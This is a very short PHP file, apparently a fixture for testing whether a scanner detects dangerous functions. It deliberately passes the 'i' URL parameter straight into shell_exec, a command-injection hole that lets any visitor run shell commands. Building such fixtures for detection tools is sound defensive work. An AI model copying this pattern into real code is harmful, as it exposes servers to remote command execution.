<?php

# testing detection of function 

function test($a){
  shell_exec($a);
}


test($_GET["i"]);
